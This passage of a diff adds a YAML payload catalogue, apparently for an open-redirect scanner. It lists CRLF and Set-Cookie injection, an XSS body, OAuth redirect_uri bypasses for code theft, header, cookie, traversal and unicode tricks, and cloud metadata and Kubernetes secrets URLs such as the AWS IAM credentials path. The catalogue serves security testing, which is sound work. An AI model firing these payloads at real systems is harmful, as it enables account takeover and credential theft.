+    severity_hint: "high"
+    interaction: false
+
+  - id: "frag-005"
+    name: "Fragment with @ path-traversal (Decepticon)"
+    category: "fragment"
+    payload: "{{TARGET}}/?redirect={{CANARY}}#@{{TARGET}}"
+    description: "Path-traversal in fragment — bypasses fragment-based validators."
+    tags: ["fragment", "path_traversal", "2026"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://tessl.io/registry/skills/github/PurpleAILAB/Decepticon/open-redirect"]
+    interaction: false
+
+  # ===========================================================================
+  #  9. CRLF / HEADER INJECTION
+  #     When the redirect target is reflected in a header, CRLF breaks out.
+  #     Active in 2026 (CVE-2026-12071).
+  # ===========================================================================
+  - id: "crlf-001"
+    name: "CRLF Location injection"
+    category: "crlf"
+    payload: "%0d%0aLocation:%20https://{{CANARY}}/"
+    description: "Injected Location header via CRLF — classic response splitting."
+    tags: ["crlf", "response-splitting"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-12071"]
+    interaction: false
+
+  - id: "crlf-002"
+    name: "LF-only injection"
+    category: "crlf"
+    payload: "%0aLocation:%20https://{{CANARY}}/"
+    description: "LF-only — some servers accept bare LF as header terminator."
+    tags: ["crlf", "response-splitting"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "crlf-003"
+    name: "CR-only injection"
+    category: "crlf"
+    payload: "%0dLocation:%20https://{{CANARY}}/"
+    description: "CR-only — legacy Mac line ending."
+    tags: ["crlf", "response-splitting"]
+    browsers: ["legacy"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "crlf-004"
+    name: "CRLF + body injection (XSS)"
+    category: "crlf"
+    payload: "%0d%0a%0d%0a<html><script>alert(1)</script></html>"
+    description: "Terminate headers and inject HTML body — XSS via redirect."
+    tags: ["crlf", "xss"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    interaction: false
+
+  - id: "crlf-005"
+    name: "Double-encoded CRLF"
+    category: "crlf"
+    payload: "%250d%250aLocation:%2520https://{{CANARY}}/"
+    description: "Double-encoded CRLF — bypasses single-decode filters."
+    tags: ["crlf", "encoding"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "crlf-006"
+    name: "CRLF with Set-Cookie"
+    category: "crlf"
+    payload: "%0d%0aSet-Cookie:%20session=attacker"
+    description: "Inject Set-Cookie for session fixation via CRLF."
+    tags: ["crlf", "session-fixation"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    interaction: false
+
+  - id: "crlf-007"
+    name: "CRLF via safe URL prefix"
+    category: "crlf"
+    payload: "https://{{TARGET}}/safe%0d%0aLocation:%20https://{{CANARY}}"
+    description: "Safe prefix then CRLF breakout — bypasses URL sanitisation that doesn't strip CRLF."
+    tags: ["crlf", "2025"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://github.com/samugit83/redamon/blob/master/agentic/skills/vulnerabilities/crlf_injection.md"]
+    interaction: false
+
+  # ===========================================================================
+  #  10. PARAMETER POLLUTION
+  #      Duplicate the redirect parameter — which wins depends on the stack.
+  # ===========================================================================
+  - id: "hpp-001"
+    name: "Safe-first, attacker-second"
+    category: "parameter_pollution"
+    payload: "?next=/safe&next=https://{{CANARY}}/"
+    description: "Safe first, canary second — many stacks use the last value."
+    tags: ["hpp", "parameter-pollution"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "hpp-002"
+    name: "Attacker-first, safe-second"
+    category: "parameter_pollution"
+    payload: "?next=https://{{CANARY}}/&next=/safe"
+    description: "Canary first, safe second — validators often read the first."
+    tags: ["hpp", "parameter-pollution"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "hpp-003"
+    name: "Array-style param"
+    category: "parameter_pollution"
+    payload: "?next[]=/safe&next[]=https://{{CANARY}}/"
+    description: "Array syntax — PHP/Rails handle differently from validators."
+    tags: ["hpp", "parameter-pollution", "array"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "hpp-004"
+    name: "Nested param object"
+    category: "parameter_pollution"
+    payload: "?next[url]=https://{{CANARY}}/"
+    description: "Nested parameter — parsers that flatten pick up canary."
+    tags: ["hpp", "parameter-pollution"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "hpp-005"
+    name: "Semicolon separator"
+    category: "parameter_pollution"
+    payload: "?next=/safe;next=https://{{CANARY}}/"
+    description: "Semicolon separator — some parsers treat as param delimiter."
+    tags: ["hpp", "separator-smuggling"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  # ===========================================================================
+  #  11. OAUTH / SSO
+  #      Redirect_uri, RelayState, returnTo, next.
+  #      Chained with OAuth code theft = critical severity.
+  # ===========================================================================
+  - id: "oauth-001"
+    name: "redirect_uri param"
+    category: "oauth_sso"
+    payload: "?redirect_uri=https://{{CANARY}}/"
+    description: "Standard OAuth 2.0 redirect_uri — chained with code theft = critical."
+    tags: ["oauth", "critical-chain"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2025-4143"]
+    interaction: false
+
+  - id: "oauth-002"
+    name: "return_to param"
+    category: "oauth_sso"
+    payload: "?return_to=https://{{CANARY}}/"
+    description: "Common in SAML/SSO implementations."
+    tags: ["oauth", "sso"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "oauth-003"
+    name: "returnUrl param"
+    category: "oauth_sso"
+    payload: "?returnUrl=https://{{CANARY}}/"
+    description: "ASP.NET MVC convention."
+    tags: ["oauth", "aspnet"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "oauth-004"
+    name: "RelayState param (SAML)"
+    category: "oauth_sso"
+    payload: "?RelayState=https://{{CANARY}}/"
+    description: "SAML RelayState — often forwarded after IdP assertion."
+    tags: ["saml", "sso", "critical-chain"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    interaction: false
+
+  - id: "oauth-005"
+    name: "next param"
+    category: "oauth_sso"
+    payload: "?next=https://{{CANARY}}/"
+    description: "Generic 'next' parameter — ubiquitous in login flows."
+    tags: ["oauth", "login-flow"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "oauth-006"
+    name: "continue param"
+    category: "oauth_sso"
+    payload: "?continue=https://{{CANARY}}/"
+    description: "Google-style continue parameter."
+    tags: ["oauth", "login-flow"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "oauth-007"
+    name: "redirect param"
+    category: "oauth_sso"
+    payload: "?redirect=https://{{CANARY}}/"
+    description: "Generic redirect parameter."
+    tags: ["oauth"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "oauth-008"
+    name: "url param"
+    category: "oauth_sso"
+    payload: "?url=https://{{CANARY}}/"
+    description: "Generic url parameter."
+    tags: ["oauth"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "oauth-009"
+    name: "callback param"
+    category: "oauth_sso"
+    payload: "?callback=https://{{CANARY}}/"
+    description: "JSONP / OAuth callback parameter."
+    tags: ["oauth", "jsonp"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "oauth-010"
+    name: "forward param"
+    category: "oauth_sso"
+    payload: "?forward=https://{{CANARY}}/"
+    description: "Generic forward parameter."
+    tags: ["oauth"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "oauth-011"
+    name: "dest param"
+    category: "oauth_sso"
+    payload: "?dest=https://{{CANARY}}/"
+    description: "Destination parameter."
+    tags: ["oauth"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "oauth-012"
+    name: "destination param"
+    category: "oauth_sso"
+    payload: "?destination=https://{{CANARY}}/"
+    description: "Destination parameter, expanded form."
+    tags: ["oauth"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "oauth-013"
+    name: "goto param"
+    category: "oauth_sso"
+    payload: "?goto=https://{{CANARY}}/"
+    description: "OpenBSD / many web apps use goto."
+    tags: ["oauth"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "oauth-014"
+    name: "target param"
+    category: "oauth_sso"
+    payload: "?target=https://{{CANARY}}/"
+    description: "Generic target parameter."
+    tags: ["oauth"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "oauth-015"
+    name: "r param (short)"
+    category: "oauth_sso"
+    payload: "?r=https://{{CANARY}}/"
+    description: "Single-letter redirect parameter — common in short-URL services."
+    tags: ["oauth", "short"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "oauth-016"
+    name: "u param (short)"
+    category: "oauth_sso"
+    payload: "?u=https://{{CANARY}}/"
+    description: "Single-letter u parameter."
+    tags: ["oauth", "short"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "oauth-017"
+    name: "redirect_uri with path traversal"
+    category: "oauth_sso"
+    payload: "?redirect_uri=https://{{TARGET}}/oauth-callback/../../../{{CANARY}}"
+    description: "Path traversal in registered redirect_uri — server normalises after validation."
+    tags: ["oauth", "path_traversal", "critical-chain"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    references: ["https://github.com/Zeeshanafridai/OAUTH-Flow-Analyzer"]
+    interaction: false
+
+  - id: "oauth-018"
+    name: "redirect_uri subdomain bypass"
+    category: "oauth_sso"
+    payload: "?redirect_uri=https://{{TARGET}}.{{CANARY}}/"
+    description: "Subdomain confusion — attacker as subdomain of trusted host."
+    tags: ["oauth", "subdomain", "critical-chain"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    interaction: false
+
+  - id: "oauth-019"
+    name: "redirect_uri with @ confusion"
+    category: "oauth_sso"
+    payload: "?redirect_uri=https://{{TARGET}}@{{CANARY}}/"
+    description: "Userinfo @ bypass in redirect_uri validation."
+    tags: ["oauth", "userinfo", "critical-chain"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    interaction: false
+
+  - id: "oauth-020"
+    name: "redirect_uri with backslash"
+    category: "oauth_sso"
+    payload: "?redirect_uri=https://{{TARGET}}\\@{{CANARY}}/"
+    description: "Backslash in redirect_uri — parser differential (CVE-2026-75628)."
+    tags: ["oauth", "backslash", "critical-chain", "2026"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    references: ["https://vuldb.com/cve/CVE-2026-75628"]
+    interaction: false
+
+  - id: "oauth-021"
+    name: "redirect_uri port bypass"
+    category: "oauth_sso"
+    payload: "?redirect_uri=https://{{TARGET}}:80@{{CANARY}}/"
+    description: "Port confusion in redirect_uri."
+    tags: ["oauth", "port", "critical-chain"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    interaction: false
+
+  - id: "oauth-022"
+    name: "redirect_uri null byte"
+    category: "oauth_sso"
+    payload: "?redirect_uri=https://{{CANARY}}%00.{{TARGET}}/"
+    description: "Null byte in redirect_uri — truncates validation in some parsers."
+    tags: ["oauth", "null-byte", "legacy"]
+    browsers: ["legacy"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "oauth-023"
+    name: "redirect_uri scheme downgrade"
+    category: "oauth_sso"
+    payload: "?redirect_uri=http://{{CANARY}}/"
+    description: "Scheme downgrade https→http — some validators only check host."
+    tags: ["oauth", "scheme-downgrade"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "oauth-024"
+    name: "redirect_uri chained open redirect"
+    category: "oauth_sso"
+    payload: "?redirect_uri=https://{{TARGET}}/redir?to=https://{{CANARY}}/"
+    description: "Chain trusted host's own open redirect — auth code forwarded to canary."
+    tags: ["oauth", "chained", "critical-chain"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    references: ["https://payloadplayground.com/blog/open-redirect-exploitation"]
+    interaction: false
+
+  - id: "oauth-025"
+    name: "redirect_uri with encoded slash"
+    category: "oauth_sso"
+    payload: "?redirect_uri=https://{{TARGET}}%2f@{{CANARY}}/"
+    description: "Encoded slash before @ — parser differential (2025)."
+    tags: ["oauth", "encoding", "parser-differential", "2025"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    interaction: false
+
+  # ===========================================================================
+  #  12. HEADER-BASED REDIRECTS
+  #      Apps that redirect based on Referer, Host, or X-Forwarded-* headers.
+  #      Scanner sends payload in header, not URL.
+  # ===========================================================================
+  - id: "hdr-001"
+    name: "Referer header redirect"
+    category: "header_based"
+    payload: "Referer: https://{{CANARY}}/"
+    description: "Login flows that redirect to Referer after auth."
+    tags: ["header", "referer"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "hdr-002"
+    name: "X-Forwarded-Host"
+    category: "header_based"
+    payload: "X-Forwarded-Host: {{CANARY}}"
+    description: "Frameworks trusting XFH build absolute URLs to canary."
+    tags: ["header", "xfh", "host-header"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "hdr-003"
+    name: "X-Forwarded-Proto + Host combo"
+    category: "header_based"
+    payload: "X-Forwarded-Proto: https|X-Forwarded-Host: {{CANARY}}"
+    description: "Combination header attack — bypasses single-header validation."
+    tags: ["header", "xfh", "xfp"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "hdr-004"
+    name: "Host header override"
+    category: "header_based"
+    payload: "Host: {{CANARY}}"
+    description: "Absolute URL construction using Host — password-reset poisoning."
+    tags: ["header", "host-header"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "hdr-005"
+    name: "RFC 7239 Forwarded header"
+    category: "header_based"
+    payload: "Forwarded: host={{CANARY}}"
+    description: "Forwarded header — often parsed by proxies."
+    tags: ["header", "forwarded"]
+    browsers: ["all"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "hdr-006"
+    name: "X-Original-URL"
+    category: "header_based"
+    payload: "X-Original-URL: /https://{{CANARY}}/"
+    description: "Reverse proxies honour X-Original-URL for routing."
+    tags: ["header", "proxy"]
+    browsers: ["all"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "hdr-007"
+    name: "X-Rewrite-URL"
+    category: "header_based"
+    payload: "X-Rewrite-URL: https://{{CANARY}}/"
+    description: "IIS + Helicon rewrite trick."
+    tags: ["header", "proxy", "iis"]
+    browsers: ["all"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "hdr-008"
+    name: "X-Forwarded-Host with port"
+    category: "header_based"
+    payload: "X-Forwarded-Host: {{CANARY}}:443"
+    description: "XFH with explicit port — bypasses port-presence checks."
+    tags: ["header", "xfh", "port"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "hdr-009"
+    name: "X-Forwarded-Server"
+    category: "header_based"
+    payload: "X-Forwarded-Server: {{CANARY}}"
+    description: "XFS header — some older proxies honour it."
+    tags: ["header", "legacy-proxy"]
+    browsers: ["all"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "hdr-010"
+    name: "X-Host header"
+    category: "header_based"
+    payload: "X-Host: {{CANARY}}"
+    description: "X-Host header — occasionally used for absolute URL construction."
+    tags: ["header", "host-header"]
+    browsers: ["all"]
+    severity_hint: "medium"
+    interaction: false
+
+  # ===========================================================================
+  #  13. COOKIE-BASED
+  #      Some apps read the redirect target from a cookie set earlier.
+  # ===========================================================================
+  - id: "cookie-001"
+    name: "redirect_url cookie"
+    category: "cookie_based"
+    payload: "redirect_url=https://{{CANARY}}/"
+    description: "Cookie-driven redirect — scanner sends as Cookie header."
+    tags: ["cookie"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "cookie-002"
+    name: "return_url cookie"
+    category: "cookie_based"
+    payload: "return_url=https://{{CANARY}}/"
+    description: "Common in SSO flows."
+    tags: ["cookie", "sso"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "cookie-003"
+    name: "next cookie"
+    category: "cookie_based"
+    payload: "next=https://{{CANARY}}/"
+    description: "Cookie named 'next'."
+    tags: ["cookie"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "cookie-004"
+    name: "Set-Cookie CRLF injection"
+    category: "cookie_based"
+    payload: "%0d%0aSet-Cookie:%20redirect_url=https://{{CANARY}}"
+    description: "CRLF into Set-Cookie header — sets redirect cookie via response splitting."
+    tags: ["cookie", "crlf"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    interaction: false
+
+  - id: "cookie-005"
+    name: "Cookie parser pollution"
+    category: "cookie_based"
+    payload: "session=valid; redirect=https://{{CANARY}}/"
+    description: "Cookie parser pollution — apps trusting the last cookie value."
+    tags: ["cookie", "parameter-pollution", "2025"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://vulnerability.circl.lu/vuln/CVE-2026-9679"]
+    interaction: false
+
+  # ===========================================================================
+  #  14. PATH TRAVERSAL
+  #      Traverse out of current path to attacker-controlled route.
+  #      Includes client-side path traversal (Grafana CVE-2025-6023).
+  # ===========================================================================
+  - id: "path-001"
+    name: "Classic ../ chain"
+    category: "path_traversal"
+    payload: "../../../https://{{CANARY}}/"
+    description: "Traversal to URL that looks like it starts with / after normalisation."
+    tags: ["path-traversal"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "path-002"
+    name: "Encoded traversal"
+    category: "path_traversal"
+    payload: "..%2f..%2f..%2fhttps://{{CANARY}}/"
+    description: "URL-encoded slashes in traversal."
+    tags: ["path-traversal", "encoding"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "path-003"
+    name: "Double-encoded traversal"
+    category: "path_traversal"
+    payload: "..%252f..%252f..%252fhttps://{{CANARY}}/"
+    description: "Double-encoded traversal."
+    tags: ["path-traversal", "encoding"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "path-004"
+    name: "Traversal to protocol-relative"
+    category: "path_traversal"
+    payload: "../..//{{CANARY}}/"
+    description: "Traverse out then protocol-relative redirect."
+    tags: ["path-traversal", "protocol-relative"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "path-005"
+    name: "Mixed traversal + encoding"
+    category: "path_traversal"
+    payload: "..%2f..%2f%2f{{CANARY}}/"
+    description: "Mixed traversal and encoding."
+    tags: ["path-traversal", "encoding"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "path-006"
+    name: "Client-side path traversal (CVE-2025-6023 bypass)"
+    category: "path_traversal"
+    payload: "/%23/..//\\/{{CANARY}}/"
+    description: "Grafana client-side path traversal + open redirect — 302 to canary."
+    tags: ["path-traversal", "client-side", "2025"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    references: ["https://ethiack.com/news/grafana-cve-2025-6023-bypass"]
+    interaction: false
+
+  - id: "path-007"
+    name: "Dot-slash-dot-slash with fragment"
+    category: "path_traversal"
+    payload: "/..//{{CANARY}}/#@{{TARGET}}"
+    description: "Normalisation to protocol-relative with fragment distraction."
+    tags: ["path-traversal", "fragment", "2026"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-56326"]
+    interaction: false
+
+  - id: "path-008"
+    name: "Encoded dot traversal"
+    category: "path_traversal"
+    payload: "/%2e%2e//{{CANARY}}"
+    description: "Encoded dots — normalised to protocol-relative after validation."
+    tags: ["path-traversal", "encoding", "2026"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-56326"]
+    interaction: false
+
+  - id: "path-009"
+    name: "App-prefixed traversal"
+    category: "path_traversal"
+    payload: "/app/..//{{CANARY}}"
+    description: "App-prefixed traversal — bypasses validator that checks prefix."
+    tags: ["path-traversal", "2026"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-56326"]
+    interaction: false
+
+  - id: "path-010"
+    name: "Dot-slash-dot-slash protocol-relative"
+    category: "path_traversal"
+    payload: "/.//{{CANARY}}"
+    description: "Normalises to //canary — WHATWG URL standard."
+    tags: ["path-traversal", "protocol-relative", "2026"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-56326"]
+    interaction: false
+
+  # ===========================================================================
+  #  15. CLOUD / METADATA
+  #      Redirects that reach cloud metadata are SSRF in disguise.
+  # ===========================================================================
+  - id: "cloud-001"
+    name: "AWS metadata root"
+    category: "cloud_specific"
+    payload: "http://169.254.169.254/latest/meta-data/"
+    description: "Redirect to AWS metadata — SSRF chain potential."
+    tags: ["cloud", "aws", "ssrf"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    interaction: false
+
+  - id: "cloud-002"
+    name: "AWS IAM credentials"
+    category: "cloud_specific"
+    payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    description: "AWS IAM credential endpoint — critical if reachable."
+    tags: ["cloud", "aws", "ssrf", "critical"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    interaction: false
+
+  - id: "cloud-003"
+    name: "GCP metadata"
+    category: "cloud_specific"
+    payload: "http://metadata.google.internal/computeMetadata/v1/"
+    description: "GCP metadata — requires Metadata-Flavor: Google header."
+    tags: ["cloud", "gcp", "ssrf"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    interaction: false
+
+  - id: "cloud-004"
+    name: "Azure IMDS"
+    category: "cloud_specific"
+    payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+    description: "Azure IMDS — requires Metadata: true header."
+    tags: ["cloud", "azure", "ssrf"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    interaction: false
+
+  - id: "cloud-005"
+    name: "Alibaba metadata"
+    category: "cloud_specific"
+    payload: "http://100.100.100.200/latest/meta-data/"
+    description: "Alibaba Cloud metadata endpoint."
+    tags: ["cloud", "alibaba", "ssrf"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    interaction: false
+
+  - id: "cloud-006"
+    name: "DigitalOcean metadata"
+    category: "cloud_specific"
+    payload: "http://169.254.169.254/metadata/v1/"
+    description: "DigitalOcean droplet metadata."
+    tags: ["cloud", "digitalocean", "ssrf"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    interaction: false
+
+  - id: "cloud-007"
+    name: "Oracle Cloud metadata"
+    category: "cloud_specific"
+    payload: "http://169.254.169.254/opc/v1/instance/"
+    description: "Oracle Cloud metadata."
+    tags: ["cloud", "oracle", "ssrf"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    interaction: false
+
+  - id: "cloud-008"
+    name: "AWS ECS task metadata"
+    category: "cloud_specific"
+    payload: "http://169.254.170.2/v2/metadata"
+    description: "AWS ECS task metadata — returns credentials in some configs."
+    tags: ["cloud", "aws", "ecs", "ssrf"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    interaction: false
+
+  - id: "cloud-009"
+    name: "Kubernetes API"
+    category: "cloud_specific"
+    payload: "https://kubernetes.default.svc/api/v1/namespaces/default/secrets"
+    description: "Kubernetes API — secrets accessible if SA token has permissions."
+    tags: ["cloud", "kubernetes", "ssrf"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    interaction: false
+
+  # ===========================================================================
+  #  16. UNICODE / NFKC
+  #      NFKC normalisation, homoglyphs, fullwidth characters.
+  #      Active in 2026 (CVE-2026-73420, CVE-2026-44889).
+  # ===========================================================================
+  - id: "unicode-001"
+    name: "Fullwidth solidus"
+    category: "unicode"
+    payload: "https:／／{{CANARY}}"
+    description: "Fullwidth solidus (U+FF0F) — NFKC normalises to /."
+    tags: ["unicode", "nfkc"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "unicode-002"
+    name: "Unicode division slash"
+    category: "unicode"
+    payload: "https:∕∕{{CANARY}}"
+    description: "U+2215 division slash — NFKC normalises to /."
+    tags: ["unicode", "nfkc"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "unicode-003"
+    name: "Unicode fraction slash"
+    category: "unicode"
+    payload: "https:⁄⁄{{CANARY}}"
+    description: "U+2044 fraction slash."
+    tags: ["unicode", "nfkc"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "unicode-004"
+    name: "Ideographic full stop"
+    category: "unicode"
+    payload: "https://{{CANARY}}。evil.com/"
+    description: "U+3002 — some resolvers treat as dot separator."
+    tags: ["unicode", "idn"]
+    browsers: ["all"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "unicode-005"
+    name: "Fullwidth @ (U+FF20)"
+    category: "unicode"
+    payload: "https://{{TARGET}}＠{{CANARY}}/"
+    description: "NFKC normalises to ASCII @ — server validates before normalisation."
+    tags: ["unicode", "nfkc", "2026"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://cve.imfht.com/detail/CVE-2026-73420"]
+    interaction: false
+
+  - id: "unicode-006"
+    name: "Fullwidth letters homoglyph"
+    category: "unicode"
+    payload: "https://ｅｖｉｌ．ｃｏｍ/"
+    description: "Fullwidth ASCII letters — NFKC normalises to evil.com."
+    tags: ["unicode", "homoglyph", "2026"]
+    browsers: ["all"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "unicode-007"
+    name: "Cyrillic homoglyph"
+    category: "unicode"
+    payload: "https://аttacker.com/"
+    description: "Cyrillic 'а' instead of ASCII 'a' — IDN homoglyph."
+    tags: ["unicode", "homoglyph", "idn"]
+    browsers: ["all"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "unicode-008"
+    name: "Leading C0 control char (CVE-2026-44889)"
+    category: "unicode"
+    payload: "%1f%1f//{{CANARY}}/"
+    description: "Leading C0 control chars stripped by urlsplit — bypasses startswith check."
+    tags: ["unicode", "whitespace", "2026"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-44889"]
+    interaction: false
+
+  # ===========================================================================
+  #  17. WHITESPACE PREFIX
+  #      Leading spaces, tabs, CR/LF that some parsers trim.
+  #      CVE-2026-54770 (WebOb), CVE-2023-24329 (Python urllib).
+  # ===========================================================================
+  - id: "ws-001"
+    name: "Leading space + protocol-relative"
+    category: "whitespace"
+    payload: " %2f%2f{{CANARY}}/"
+    description: "Space then protocol-relative — urlsplit strips, browser uses."
+    tags: ["whitespace", "2026"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-54770"]
+    interaction: false
+
+  - id: "ws-002"
+    name: "Leading tab + protocol-relative"
+    category: "whitespace"
+    payload: "%09//{{CANARY}}/"
+    description: "Tab prefix — Python urllib.parse strips, browser uses."
+    tags: ["whitespace", "python", "2025"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-24329"]
+    interaction: false
+
+  - id: "ws-003"
+    name: "Leading CR + protocol-relative"
+    category: "whitespace"
+    payload: "%0d//{{CANARY}}/"
+    description: "CR prefix — stripped by urlsplit."
+    tags: ["whitespace", "2026"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "ws-004"
+    name: "Leading LF + protocol-relative"
+    category: "whitespace"
+    payload: "%0a//{{CANARY}}/"
+    description: "LF prefix — stripped by urlsplit."
+    tags: ["whitespace", "2026"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "ws-005"
+    name: "Leading space + absolute"
+    category: "whitespace"
+    payload: " https://{{CANARY}}/"
+    description: "Space then absolute — startswith checks fail on space, parser trims."
+    tags: ["whitespace"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "ws-006"
+    name: "Trailing space"
+    category: "whitespace"
+    payload: "https://{{CANARY}}/   "
+    description: "Trailing whitespace — some validators reject, browsers accept."
+    tags: ["whitespace"]
+    browsers: ["all"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "ws-007"
+    name: "Leading tab + absolute"
+    category: "whitespace"
+    payload: "%09https://{{CANARY}}/"
+    description: "Tab then absolute URL."
+    tags: ["whitespace"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "ws-008"
+    name: "Newline in hostname"
+    category: "whitespace"
+    payload: "https://{{CANARY}}/\n.invalid"
+    description: "Newline in hostname — legacy parser truncation."
+    tags: ["whitespace", "legacy"]
+    browsers: ["legacy"]
+    severity_hint: "medium"
+    interaction: false
+
+  # ===========================================================================
+  #  18. MODERN (2025 / 2026)
+  #      Parser differentials, spec ambiguities, browser normalisation.
+  # ===========================================================================
+  - id: "modern-001"
+    name: "WHATWG backslash normalisation"
+    category: "modern"
+    payload: "https:\\\\{{CANARY}}\\..\\{{TARGET}}\\"
+    description: "WHATWG treats backslashes as forward slashes — bypasses regex allow-lists."
+    tags: ["modern", "whatwg", "parser-differential", "2025"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://url.spec.whatwg.org/"]
+    interaction: false
+
+  - id: "modern-002"
+    name: "IDN/punycode homoglyph"
+    category: "modern"
+    payload: "https://xn--80ak6aa92e.com/"
+    description: "Punycode-encoded homoglyph domain rendering as trusted name."
+    tags: ["modern", "idn", "homoglyph", "2025"]
+    browsers: ["all"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "modern-003"
+    name: "Encoded slash in authority"
+    category: "modern"
+    payload: "https://{{TARGET}}%2f@{{CANARY}}/"
+    description: "Encoded slash inside authority — parser differential (2025)."
+    tags: ["modern", "encoding", "parser-differential", "2025"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "modern-004"
+    name: "Fullwidth @ trick"
+    category: "modern"
